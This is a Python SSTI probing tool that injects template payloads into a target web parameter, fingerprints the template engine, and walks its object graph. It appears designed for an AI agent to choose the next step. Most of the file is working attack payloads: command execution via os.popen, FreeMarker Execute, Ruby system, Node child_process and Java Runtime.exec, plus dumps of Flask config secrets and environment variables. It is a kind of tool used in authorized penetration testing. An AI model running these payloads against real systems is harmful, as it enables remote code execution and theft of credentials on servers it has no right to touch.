#!/usr/bin/env python3
"""ssti_probe.py — SSTI engine detection + object-graph walk. One Bash call, JSON out.

Stdlib only. Honors HTTP(S)_PROXY / ALL_PROXY env and trusts SSL_CERT_FILE.

Usage:
  python3 ssti_probe.py --url 'http://host/render' --param 'tpl'
                        [--method POST] [--body '{"tpl":"x"}']
                        [--engine jinja2] [--out /tmp/ssti.json]

Phase 1: engine detection matrix ({{7*7}}, ${7*7}, <%= 7*7 %>, ${7*7}...).
Phase 2: walk the detected engine's object graph level by level.
Each level's output is reported; the model decides the next hop.
"""
import argparse
import concurrent.futures as cf
import json
import os
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 12
MAX_BODY = 160_000

# (label, payload, signal-regex) — detection phase
DETECT = [
    ("jinja2-mako-7x7", "{{7*7}}", r"(?<!\d)49(?!\d)"),
    ("django-0", "{{7*7}}", r"(?<![\d.])0(?!\d)"),   # Django renders 0 for unknown filter
    ("dollar-7x7", "${7*7}", r"(?<!\d)49(?!\d)"),
    ("erb-7x7", "<%= 7*7 %>", r"(?<!\d)49(?!\d)"),
    ("ejs-7x7", "<%= 7*7 %>", r"(?<!\d)49(?!\d)"),
    ("handlebars-7x7", "{{7*7}}", r"(?<!\d)49(?!\d)"),
    ("thymeleaf-7x7", "${7*7}", r"(?<!\d)49(?!\d)"),
]

# engine -> [(label, payload, signal-regex)]  — object-graph walk
# note: `{{7*7}}`→49 is shared by jinja2/twig/handlebars and `${7*7}`→49 by
# freemarker/thymeleaf, so detection is a starting family, not a verdict.
WALK = {
    "jinja2": [
        ("config", "{{config}}", r"SECRET_KEY|SQLALCHEMY_DATABASE_URI|DATABASE|REDIS"),
        ("config-items", "{{config.items()}}", r"SECRET_KEY|DATABASE|SERVER_NAME"),
        ("init-globals", "{{self.__init__.__globals__}}", r"<module|__builtins__|os|subprocess"),
        ("builtins-import", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}", r"uid=|root:|nobody"),
        ("cycler-globals", "{{cycler.__init__.__globals__['os'].popen('id').read()}}", r"uid=|root:|nobody"),
        ("lipsum-globals", "{{lipsum.__init__.__globals__['os'].popen('id').read()}}", r"uid=|root:|nobody"),
        ("request-env", "{{request.environ}}", r"REMOTE_ADDR|HTTP_HOST|SERVER_SOFTWARE"),
        ("request-args", "{{request.args}}", r"<MultiValues|<Request"),
        ("class-str", "{{''.__class__}}", r"<class 'str'>"),
    ],
    "mako": [
        ("globals", "${context.get('os') or 1}", r"os|<module"),
        ("render-globals", "${self.__globals__}", r"<module|__builtins__"),
    ],
    "twig": [
        ("env-functions", "{{_self.env.get_functions()}}", r"env|random|date|dump"),
        ("env-dump", "{{dump(_self)}}", r"Twig\\\\Environment|env"),
        ("exec-callback", '{{_self.env.registerUndefinedFilterCallback("exec")}}', r"exec|"),
    ],
    "freemarker": [
        ("new-builtins", "${.new_builtins?keys?join(',')} ", r"abs|cap|exec|now"),
        ("version", "${.version}", r"\d+\.\d"),
        ("execute", '${"freemarker.template.utility.Execute"?new()("id")}', r"uid=|root:|nobody"),
    ],
    "velocity": [
        ("chr", "${'exec'.reverse()}", r"cexe"),
        ("runtime", "$runtimeServices", r"VelocityEngine|runtime"),
    ],
    "erb": [
        ("ruby-version", "<%= RUBY_VERSION %>", r"\d+\.\d+\.\d+"),
        ("env", "<%= ENV %>", r"PATH|HOME|SECRET|DATABASE"),
        ("system", '<%= system("id") %>', r"uid=|root:|nobody"),
    ],
    "ejs": [
        ("version", "<%= process.version %>", r"v\d+\.\d+"),
        ("globals", "<%= Object.keys(global) %>", r"global|process"),
        ("exec", "<%= require('child_process').execSync('id').toString() %>", r"uid=|root:|nobody"),
    ],
    "thymeleaf": [
        ("spel-t", "${T(java.lang.Character).getNumericValue('A')}", r"\b65\b"),
        ("spel-runtime", "${T(java.lang.Runtime).getRuntime().exec('id')} ", r"uid=|root:|nobody|Process"),
    ],
}


def ctx_ssl():
    ca = os.environ.get("SSL_CERT_FILE") or os.environ.get("CURL_CA_BUNDLE")
    if ca and os.path.exists(ca):
        return ssl.create_default_context(cafile=ca)
    return ssl.create_default_context()


def do_request(url, method, headers, body, ctx):
    data = body.encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in headers:
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as r:
            raw = r.read(MAX_BODY + 1)
            return r.status, raw, None
    except urllib.error.HTTPError as e:
        raw = e.read(MAX_BODY + 1)
        return e.code, raw, None
    except Exception as e:  # noqa: BLE001
        return None, None, "%s: %s" % (type(e).__name__, e)


def inject(url, method, param, body, value, header_mode=False):
    if header_mode:
        return url, body, {param: value}
    if body is not None:
        try:
            doc = json.loads(body)
            _setkey(doc, param, value)
            return url, json.dumps(doc, ensure_ascii=False), None
        except Exception:
            doc = urllib.parse.parse_qs(body, keep_blank_values=True)
            doc[param] = [value]
            return url, urllib.parse.urlencode(doc, doseq=True), None
    q = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
    for i, (k, _) in enumerate(query):
        if k == param:
            query[i] = (k, value)
            break
    else:
        query.append((param, value))
    return urllib.parse.urlunsplit((q.scheme, q.netloc, q.path,
                                    urllib.parse.urlencode(query, doseq=True), q.fragment)), None, None


def _setkey(doc, key, val):
    if isinstance(doc, dict):
        for k, v in doc.items():
            if k == key and isinstance(v, (str, int, float)):
                doc[k] = val
                return
            _setkey(v, key, val)
    elif isinstance(doc, list):
        for v in doc:
            _setkey(v, key, val)


def snippet(text, pat, span=140):
    m = re.search(pat, text, re.S)
    if not m:
        return None
    a, b = max(0, m.start() - span // 2), min(len(text), m.end() + span // 2)
    return text[a:b][:280]


def run(url, method, param, body, headers, header_mode, engine, ctx):
    def fire(payload):
        u, b, ho = inject(url, method, param, body, payload, header_mode)
        hs = list(headers)
        if ho:
            hs += list(ho.items())
        status, raw, err = do_request(u, method, hs, b, ctx)
        return status, (raw.decode("utf-8", "replace") if raw else ""), err

    # phase 1: detection
    detected = None
    det_results = []
    with cf.ThreadPoolExecutor(max_workers=3) as ex:
        futs = [(lbl, ex.submit(fire, pl)) for lbl, pl, _ in DETECT]
        for (lbl, _pl, rx), (_, f) in zip(DETECT, futs):
            status, text, err = f.result()
            hit = bool(text) and re.search(rx, text) is not None
            det_results.append({
                "probe": _pl, "status": status, "signal": hit,
                "evidence": snippet(text, rx) if hit else None,
                "error": err,
            })
            if hit and detected is None:
                if lbl == "jinja2-mako-7x7":
                    detected = "jinja2"
                elif lbl == "dollar-7x7":
                    detected = "freemarker"
                elif lbl == "thymeleaf-7x7":
                    detected = "thymeleaf"
                elif lbl == "erb-7x7":
                    detected = "erb"
                elif lbl == "ejs-7x7":
                    detected = "ejs"
                elif lbl == "django-0":
                    detected = "django"
                elif lbl == "handlebars-7x7":
                    detected = "handlebars"

    # phase 2: walk the detected family. `{{7*7}}`→49 is shared by jinja2/twig/
    # handlebars, `${7*7}`→49 by freemarker/thymeleaf — walk all family members.
    if engine:
        engines = [engine]
    elif detected in ("jinja2", "handlebars"):
        engines = ["jinja2", "mako", "twig"]
    elif detected == "freemarker":
        engines = ["freemarker", "thymeleaf"]
    elif detected == "thymeleaf":
        engines = ["thymeleaf", "freemarker"]
    elif detected:
        engines = [detected]
    else:
        engines = []
    walk_results = []
    for eng in engines:
        for lbl, pl, rx in WALK.get(eng, []):
            status, text, err = fire(pl)
            hit = bool(text) and re.search(rx, text, re.S) is not None
            walk_results.append({
                "engine": eng, "label": lbl, "payload": pl,
                "status": status, "signal": hit,
                "evidence": snippet(text, rx) if hit else None,
                "output": text[:600] if (hit or "config" in lbl or "env" in lbl) else None,
                "error": err,
            })

    n_det = sum(1 for d in det_results if d["signal"])
    n_walk = sum(1 for w in walk_results if w["signal"])
    if any(w["label"] in ("builtins-import", "cycler-globals", "lipsum-globals",
                          "execute", "system", "exec") and w["signal"] for w in walk_results):
        verdict = "SSTI_EXEC"
    elif n_walk:
        verdict = "SSTI_OBJECT_ACCESS"
    elif n_det:
        verdict = "SSTI_DETECTED"
    else:
        verdict = "NO_SSTI"
    return {
        "url": url, "param": param,
        "detected_engine": detected, "engines_walked": engines,
        "verdict": verdict,
        "detection": det_results, "walk": walk_results,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--body", default=None)
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--header-mode", action="store_true")
    ap.add_argument("--engine", default=None,
                    choices=sorted(WALK) + ["django", "handlebars"])
    ap.add_argument("--out", default=None)
    a = ap.parse_args()

    headers = []
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))
    if not any(k.lower() == "content-type" for k, _ in headers) and a.body:
        headers.append(("Content-Type", "application/json"))

    out = run(a.url, a.method.upper(), a.param, a.body, headers, a.header_mode, a.engine, ctx_ssl())
    s = json.dumps(out, ensure_ascii=False, indent=1)
    print(s)
    if a.out:
        with open(a.out, "w", encoding="utf-8") as f:
            f.write(s)


if __name__ == "__main__":
    main()
